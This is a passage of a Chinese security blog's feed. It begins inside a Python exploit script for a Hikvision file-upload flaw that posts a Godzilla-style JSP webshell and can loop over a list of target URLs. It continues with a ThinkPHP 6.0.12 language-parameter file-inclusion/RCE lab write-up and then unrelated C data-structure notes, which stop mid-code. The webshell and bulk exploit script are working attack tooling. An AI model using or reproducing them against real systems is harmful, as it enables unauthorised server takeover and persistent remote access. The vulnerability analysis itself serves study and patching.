data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute(\&quot;payload\&quot;)==null)&#123;session.setAttribute(\&quot;payload\&quot;,new X(this.getClass().getClassLoader()).Q(data));&#125;else&#123;request.setAttribute(\&quot;parameters\&quot;,data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute(\&quot;payload\&quot;)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));&#125; &#125;catch (Exception e)&#123;&#125;\r\n%&gt;\r\n-----------------------------12719375598068828622754559132--\r\n&quot;</span></span><br><span class="line">r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,verify=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="comment"># print(&quot;哥斯拉默认密码:&quot;+burp0_url+&quot;/clusterMgr/test.jsp;.js&quot;)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;海康综合安防文件上传&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>,<span class="string">&quot;--url&quot;</span>, metavar=<span class="string">&#x27;url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;URL&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="string">&quot;--file&quot;</span>,metavar=<span class="string">&#x27;file&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;FILE&#x27;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"><span class="keyword">if</span> args.url:</span><br><span class="line"><span class="built_in">print</span>(args.url)</span><br><span class="line">poc(args.url)</span><br><span class="line"><span class="keyword">if</span> args.file:</span><br><span class="line"><span class="keyword">for</span> url <span class="keyword">in</span> <span class="built_in">open</span>(args.file).readlines():</span><br><span class="line"><span class="built_in">print</span>(url)</span><br><span class="line">poc(url) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;--------------------------------&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;致远OA任意用户重置&quot;&gt;&lt;a href=&quot;#致远OA任意用户重置&quot; class=&quot;headerlink&quot; title=&quot;致远OA任意用户重置&quot;&gt;&lt;/a&gt;致远OA任意用户重置&lt;/h1&gt;&lt;figure class=&quot;highlight http&quot;&gt;&lt;table&gt;&lt;tr</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>QVD-2022-46174-thinkphp多语言RCE</title>
    <link href="https://iloveflag.github.io/2022/12/12/QVD-2022-46174-thinkphp%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/"/>
    <id>https://iloveflag.github.io/2022/12/12/QVD-2022-46174-thinkphp%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/</id>
    <published>2022-12-12T08:07:10.000Z</published>
    <updated>2025-02-14T14:45:19.303Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think tp 6.0.12</span><br></pre></td></tr></table></figure><p>将composer.json中的topthink/framework依赖改为<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=7.2.5&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;6.0.12&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/think-orm&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.0&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><br>tip:去掉^,不然会自动更新到最新版本<br>开启多语言功能<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/312153916227546.png =514x" alt="2022-12-12_16-38-23"></p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>在public目录下新建test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;iloveflag&quot;</span>;</span><br></pre></td></tr></table></figure><br>访问<a href="http://127.0.0.1/tp/public/index.php?lang=../../../../../public/test">http://127.0.0.1/tp/public/index.php?lang=../../../../../public/test</a></p><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/26383716221253.png =514x" alt="2022-12-12_16-17-42"><br>入口文件tp\vendor\topthink\framework\src\think\middleware\LoadLangPack.php中<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/407054216247712.png =428x" alt="2022-12-12_16-42-25"><br>handle函数中使用了detect函数检测传入的$request对象<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/256714516240381.png =535x" alt="2022-12-12_16-45-14"><br>进入detect()函数在91行if检测语言列表的时候发现$this-&gt;config[‘allow_lang_list’]为空且 $langSet为../../../../../public/test不在匹配列表中<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/332454916236936.png =809x" alt="2022-12-12_16-49-19"><br>返回detect函数$range值与 $this-&gt;lang-&gt;defaultLangSet()相比较<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/855616232690.png =814x" alt=""><br>下一步关键处:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;lang-&gt;<span class="title function_ invoke__">switchLangSet</span>(<span class="variable">$langset</span>);</span><br></pre></td></tr></table></figure><br>进入查看load函数，中间变量拼接成了文件包含的地址<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/330480818250570.png =571x" alt="2022-12-12_18-07-54"><br>跟进load()函数<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/193451918248174.png =508x" alt="2022-12-12_18-19-10"><br>遍历出$file 为 $name变量<br>跟进parse()函数，明显进行了include操作造成漏洞<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/247712218245676.png =489x" alt="2022-12-12_18-21-42"></p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>参照此文<br><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp">docker-php-include-getshell.html#0x06-pearcmdphp</a><br>进行文件写入，然后文件包含getshell<br>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定—with-pear才会安装<br>Docker环境下的PHP会开启register_argc_argv这个配置<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/536204918249357.png =373x" alt=""><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/193293119244493.png =445x" alt=""><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/435803119238039.png =411x" alt=""></p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>官方已修复漏洞<br><a href="https://github.com/top-think/framework/commit/c4acb8b4001b98a0078eda25840d33e295a7f099#diff-87105b2e85b593c39052051afbad00516b15ebe5fa0c445e91cfbb397fe0e8cb">https://github.com/top-think/framework/commit/c4acb8b4001b98a0078eda25840d33e295a7f099#diff-87105b2e85b593c39052051afbad00516b15ebe5fa0c445e91cfbb397fe0e8cb</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://iloveflag.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>数据结构-王道考研复习笔记</title>
    <link href="https://iloveflag.github.io/2021/11/06/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E7%8E%8B%E9%81%93%E8%80%83%E7%A0%94%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://iloveflag.github.io/2021/11/06/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E7%8E%8B%E9%81%93%E8%80%83%E7%A0%94%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-11-06T09:00:00.000Z</published>
    <updated>2025-02-14T14:45:19.324Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DS"><a href="#DS" class="headerlink" title="DS"></a>DS</h1><h1 id="2-线性表"><a href="#2-线性表" class="headerlink" title="2.线性表"></a>2.线性表</h1><h2 id="2-2-顺序表的定义"><a href="#2-2-顺序表的定义" class="headerlink" title="2.2 顺序表的定义"></a>2.2 顺序表的定义</h2><h3 id="顺序表的静态分配"><a href="#顺序表的静态分配" class="headerlink" title="顺序表的静态分配"></a>顺序表的静态分配</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//顺序表 静态分配 </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">ElemType data[Maxsize];</span><br><span class="line"><span class="type">int</span> length;</span><br><span class="line">&#125;Sqlist; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList</span><span class="params">(Sqlist &amp;L)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;MaxSize;i++)&#123;</span><br><span class="line">L.data[i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">L.length=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">Sqlist L;</span><br><span class="line">InitList(L);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="顺序表的动态分配"><a href="#顺序表的动态分配" class="headerlink" title="顺序表的动态分配"></a>顺序表的动态分配</h3><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/1752423170760.png" alt="内存指示图"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//顺序表 动态分配 </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> InitSize 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="type">int</span> *data;</span><br><span class="line"><span class="type">int</span> MaxSize;</span><br><span class="line"><span class="type">int</span> length;</span><br><span class="line">&#125;SeqList;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList</span><span class="params">(SeqList &amp;L)</span>&#123;</span><br><span class="line">L.data=(<span class="type">int</span> *)<span class="built_in">malloc</span>(InitSize*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">L.length=<span class="number">0</span>;</span><br><span class="line">L.MaxSize=InitSize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">IncreaseSize</span><span class="params">(SeqList &amp;L,<span class="type">int</span> len)</span>&#123;</span><br><span class="line"><span class="type">int</span> *p=L.data;</span><br><span class="line">L.data=(<span class="type">int</span> *)<span class="built_in">malloc</span>((L.MaxSize+len)*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;L.length;i++)&#123;</span><br><span class="line">L.data[i]=p[i];</span><br><span class="line">&#125;</span><br><span class="line">L.MaxSize=L.MaxSize+len;</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">SeqList L;</span><br><span class="line">InitList(L);</span><br><span class="line">IncreaseSize(L,<span class="number">5</span>);</span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-3-顺序表的插入删除"><a href="#2-3-顺序表的插入删除" class="headerlink" title="2.3 顺序表的插入删除"></a>2.3 顺序表的插入删除</h2><h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">ListInsert</span><span class="params">(SqList &amp;L,<span class="type">int</span> i,<span class="type">int</span> e)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(i&lt;<span class="number">1</span>||i&gt;L.length+<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(L.length&gt;=MaxSize)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=L.length;j&gt;=i;j--)&#123;</span><br><span class="line">L.data[j]=L.data[j<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line">L.data[i<span class="number">-1</span>]=e;</span><br><span class="line">L.length++;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>best O(1)<br>worse O(n)<br>avg O(n)</p><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">ListDelete</span><span class="params">(SqList &amp;L,<span class="type">int</span> i,<span class="type">int</span> &amp;e)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(i&lt;<span class="number">1</span>||i&gt;L.length)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">e=L.data[i<span class="number">-1</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=i;j&lt;L.length;j++)&#123;</span><br><span class="line">L.data[j<span class="number">-1</span>]=L.data[j];</span><br><span class="line">&#125;</span><br><span class="line">L.length--;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">```  </span><br><span class="line">best <span class="title function_">O</span><span class="params">(<span class="number">1</span>)</span></span><br><span class="line">worse <span class="title function_">O</span><span class="params">(n)</span></span><br><span class="line">avg <span class="title function_">O</span><span class="params">(n)</span>  </span><br><span class="line">## 2.4 顺序表的查找</span><br><span class="line">### 按位查找</span><br><span class="line">```c</span><br><span class="line">ElemType <span class="title function_">GetElem</span><span class="params">(SqList L,<span class="type">int</span> i)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> L.data[i<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>动态分配也可以使用<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/5307207219187.png" alt=""><br>ALL O(1)</p><h3 id="按值查找"><a href="#按值查找" class="headerlink" title="按值查找"></a>按值查找</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">LocateElem</span><span class="params">(SeqList L,ElemType e)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;L.length;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(L.data[i]==e)&#123;</span><br><span class="line"><span class="keyword">return</span> i+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>best O(1)<br>worse O(n)<br>avg O(n)</p><h2 id="2-5-单链表的定义"><a href="#2-5-单链表的定义" class="headerlink" title="2.5 单链表的定义"></a>2.5 单链表的定义</h2><p>顺序表的优点：可随机存取，存储密度高<br>顺序表的缺点：要求大片连续空间，改变容量不方便<br>单链表的优点：不要求大片连续空间，改变容量方便<br>单链表的缺点：不可随机存取，要耗费一定空间存放指针</p><h3 id="常规定义"><a href="#常规定义" class="headerlink" title="常规定义"></a>常规定义</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">p</span>=</span>(<span class="keyword">struct</span> LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> LNode));</span><br></pre></td></tr></table></figure><h3 id="书本中的定义"><a href="#书本中的定义" class="headerlink" title="书本中的定义"></a>书本中的定义</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br></pre></td></tr></table></figure><p>等价于<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> <span class="title">LNode</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">LinkList</span>;</span></span><br></pre></td></tr></table></figure><br>声明头指针：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LNode *L;</span><br><span class="line">LinkList L;</span><br></pre></td></tr></table></figure><br>强调这是一个单链表 —-使用LinkList<br>强调这是一个结点 —-使用LNode*</p><h3 id="不带头节点的单链表"><a href="#不带头节点的单链表" class="headerlink" title="不带头节点的单链表"></a>不带头节点的单链表</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitList</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">L=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">LinkList L;</span><br><span class="line">InitList(L);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">Empty</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(L==<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="带头节点的单链表"><a href="#带头节点的单链表" class="headerlink" title="带头节点的单链表"></a>带头节点的单链表</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitList</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">L=(LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line"><span class="keyword">if</span>(L==<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">L-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">LinkList L;</span><br><span class="line">InitList(L);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">Empty</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(L-&gt;next==<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-6-单链表的插入删除"><a href="#2-6-单链表的插入删除" class="headerlink" title="2.6 单链表的插入删除"></a>2.6 单链表的插入删除</h2><h3 id="按位序插入（带头结点）"><a href="#按位序插入（带头结点）" class="headerlink" title="按位序插入（带头结点）"></a>按位序插入（带头结点）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">ListInsert</span><span class="params">(LinkList &amp;L,<span class="type">int</span> i,ElemType e)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(i&lt;<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">LNode *p;</span><br><span class="line"><span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">p=L;</span><br><span class="line"><span class="keyword">while</span>(p!=NUL&amp;&amp;j&lt;i<span class="number">-1</span>)&#123;</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(p==<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">LNode *s=(LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">s-&gt;data=e;</span><br><span class="line">s-&gt;next=p-&gt;next;</span><br><span class="line">p-&gt;next=s;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>best O(1)<br>worse O(n)</p><h3 id="按位序插入（不带头结点）"><a href="#按位序插入（不带头结点）" class="headerlink" title="按位序插入（不带头结点）"></a>按位序插入（不带头结点）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">ListInsert</span><span class="params">(LinkList &amp;L,<span class="type">int</span> i,ElemType e)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(i&lt;<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span 